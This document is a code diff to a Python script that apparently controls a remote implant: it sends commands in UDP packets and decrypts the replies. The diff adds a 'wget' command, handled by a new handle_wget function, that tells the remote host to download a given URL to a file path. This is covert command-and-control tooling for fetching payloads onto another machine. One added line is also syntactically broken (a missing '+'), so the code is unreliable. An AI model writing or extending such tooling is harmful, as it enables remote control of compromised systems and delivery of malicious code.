@@ -6,6 +6,7 @@ from multiprocessing import Process, SimpleQueue
 import argparse
 from ipaddress import ip_address, IPv6Address
 from sys import exit
+from time import sleep
 
 # Command Line Arguments
 parser = argparse.ArgumentParser("./main.py")
@@ -64,8 +65,19 @@ def send_udp(data: str):
     # Send the packet.
     send(pkt, verbose=0)
 
-def list_files():
-    pass
+def handle_wget(data):
+    # 1. Send command
+    send_udp(data)
+    # 2. Receive response
+    encrypted = None
+    while True:
+        if queue.empty():
+            sleep(0.5)
+            continue
+        encrypted = queue.get()
+        break
+    decrypted = encryption_handler.decrypt(encrypted)
+    print(f"Response: {decrypted.decode('utf-8')}")
 
 if __name__ == "__main__":
 
@@ -108,6 +120,13 @@ if __name__ == "__main__":
                     break
                 decrypted = encryption_handler.decrypt(encrypted)
                 print(f"Response: {decrypted.decode('utf-8')}")
+                continue
+        if arg_count == 3:
+            if args[0] == WGET:
+                url = args[1]
+                filepath = args[2]
+                data = args[0] + " " args[1] + " " + args[2]
+                handle_wget(data)
                 continue
         else:
             print(f"Command not found: {command}")
